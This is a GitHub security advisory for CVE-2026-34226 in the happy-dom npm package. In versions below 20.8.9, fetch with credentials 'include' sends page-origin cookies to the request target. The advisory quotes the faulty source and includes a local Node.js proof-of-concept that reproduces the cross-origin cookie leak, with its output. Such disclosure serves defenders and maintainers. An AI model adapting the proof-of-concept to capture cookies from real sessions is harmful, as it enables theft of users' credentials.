# [H] Happy DOM's fetch credentials include uses page-origin cookies instead of target-origin cookies

## Summary
Severity: High
Advisory: GHSA-w4gp-fjgq-3q4g
CVE: CVE-2026-34226
CWE: CWE-201
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-03-29
Source: https://github.com/advisories/GHSA-w4gp-fjgq-3q4g
Type: github-advisory

## Affected
- npm: `happy-dom` — affected >=0 <20.8.9

## Details
### Summary
`happy-dom` may attach cookies from the current page origin (`window.location`) instead of the request target URL when `fetch(..., { credentials: "include" })` is used. This can leak cookies from origin A to destination B.

### Details
In [`packages/happy-dom/src/fetch/utilities/FetchRequestHeaderUtility.ts`](https://github.com/capricorn86/happy-dom/blob/f8d8cad41e9722fab9eefb9dfb3cca696462e908/packages/happy-dom/src/fetch/utilities/FetchRequestHeaderUtility.ts) (`getRequestHeaders()`), cookie selection is performed with `originURL`:

```ts
const originURL = new URL(options.window.location.href);
const isCORS = FetchCORSUtility.isCORS(originURL, options.request[PropertySymbol.url]);
// ...
const cookies = options.browserFrame.page.context.cookieContainer.getCookies(
  originURL,
  false
);
```

Here, `originURL` represents the page URL, not the request destination URL. For outgoing requests, cookie lookup should use the request URL (for example: `new URL(options.request[PropertySymbol.url])`).

### PoC Script Content

```javascript
const http = require('http');
const dns = require('dns').promises;
const { Browser } = require('happy-dom');

async function listen(server, host) {
  return new Promise((resolve) => server.listen(0, host, () => resolve(server.address().port)));
}

async function run() {
  let observedCookieHeader = null;
  const pageHost = process.env.PAGE_HOST || 'a.127.0.0.1.nip.io';
  const apiHost = process.env.API_HOST || 'b.127.0.0.1.nip.io';

  console.log('=== PoC: Wrong Cookie Source URL in credentials:include ===');
  console.log('Setup:');
  console.log(`  Page Origin Host : ${pageHost}`);
  console.log(`  Request Target Host: ${apiHost}`);
  console.log('  (both resolve to 127.0.0.1 via public wildcard DNS)');
  console.log('');

  await dns.lookup(pageHost);
  await dns.lookup(apiHost);

  const pageServer = http.createServer((req, res) => {
    res.writeHead(200, { 'content-type': 'text/plain' });
    res.end('page host');
  });

  const apiServer = http.createServer((req, res) => {
    observedCookieHeader = req.headers.cookie || '';
    const origin = req.headers.origin || '';
    res.writeHead(200, {
      'content-type': 'application/json',
      'access-control-allow-origin': origin,
      'access-control-allow-credentials': 'true'
    });
    res.end(JSON.stringify({ ok: true }));
  });

  const pagePort = await listen(pageServer, '127.0.0.1');
  const apiPort = await listen(apiServer, '127.0.0.1');

  const browser = new Browser();

  try {
    const context = browser.defaultContext;

    // Page host: pageHost (local DNS)
    const page = context.newPage();
    page.mainFrame.url = `http://${pageHost}:${pagePort}/dashboard`;
    page.mainFrame.window.document.cookie = 'page_cookie=PAGE_ONLY';

    // Target host: apiHost (local DNS)
    const apiSeedPage = context.newPage();
    apiSeedPage.mainFrame.url = `http://${apiHost}:${apiPort}/seed`;
    apiSeedPage.mainFrame.window.document.cookie = 'api_cookie=API_ONLY';

    // Trigger cross-host request with credentials.
    const res = await page.mainFrame.window.fetch(`http://${apiHost}:${apiPort}/data`, {
      credentials: 'include'
    });
    await res.text();

    const leakedPageCookie = observedCookieHeader.includes('page_cookie=PAGE_ONLY');
    const expectedApiCookie = observedCookieHeader.includes('api_cookie=API_ONLY');

    console.log('Expected:');
    console.log('  Request to target host should include "api_cookie=API_ONLY".');
    console.log('  Request should NOT include "page_cookie=PAGE_ONLY".');
    console.log('');

    console.log('Actual:');
    console.log(`  request cookie header: "${observedCookieHeader || '(empty)'}"`);
    console.log(`  includes page_cookie: ${leakedPageCookie}`);
    console.log(`  includes api_cookie : ${expectedApiCookie}`);
    console.log('');

    if (leakedPageCookie && !expectedApiCookie) {
      console.log('Result: VULNERABLE behavior reproduced.');
      process.exitCode = 0;
    } else {
      console.log('Result: Vulnerable behavior NOT reproduced in this run/version.');
      process.exitCode = 1;
    }
  } finally {
    await browser.close();
    pageServer.close();
    apiServer.close();
  }
}

run().catch((error) => {
  console.error(error);
  process.exit(1);
});

```


Environment:
1. Node.js >= 22
2. `happy-dom` 20.6.1
3. DNS names resolving to local loopback via `*.127.0.0.1.nip.io`

Reproduction steps:
1. Set page host cookie: `page_cookie=PAGE_ONLY` on `a.127.0.0.1.nip.io`
2. Set target host cookie: `api_cookie=API_ONLY` on `b.127.0.0.1.nip.io`
3. From page host, call fetch to target host with `credentials: "include"`
4. Observe `Cookie` header received by the target host

Expected:
1. Include `api_cookie=API_ONLY`
2. Do not include `page_cookie=PAGE_ONLY`

Actual (observed):
1. Includes `page_cookie=PAGE_ONLY`
2. Does not include `api_cookie=API_ONLY`

Observed output:
```text
=== PoC: Wrong Cookie Source URL in credentials:include ===
Setup:
  Page Origin Host : a.127.0.0.1.nip.io
  Request Target Host: b.127.0.0.1.nip.io
  (both resolve to 127.0.0.1 via public wildcard DNS)

Expected:
  Request to target host should include "api_cookie=API_ONLY".
  Request should NOT include "page_cookie=PAGE_ONLY".

Actual:
  request cookie header: "page_cookie=PAGE_ONLY"
  includes page_cookie: true
  includes api_cookie : false

Result: VULNERABLE behavior reproduced.
```

### Impact
Cross-origin sensitive information disclosure (cookie leakage).
Impacted users are applications relying on `happy-dom` browser-like fetch behavior in authenticated/session-based flows (for example SSR/test/proxy-like scenarios), where cookies from one origin can be sent to another origin.

## References
- https://github.com/capricorn86/happy-dom/security/advisories/GHSA-w4gp-fjgq-3q4g
- https://nvd.nist.gov/vuln/detail/CVE-2026-34226
- https://github.com/capricorn86/happy-dom/pull/2117
- https://github.com/capricorn86/happy-dom/commit/68324c21d7b98f53f7bb5a7b3e185bda7106e751
- https://github.com/capricorn86/happy-dom
- https://github.com/capricorn86/happy-dom/blob/f8d8cad41e9722fab9eefb9dfb3cca696462e908/packages/happy-dom/src/fetch/utilities/FetchRequestHeaderUtility.ts
- https://github.com/capricorn86/happy-dom/releases/tag/v20.8.9
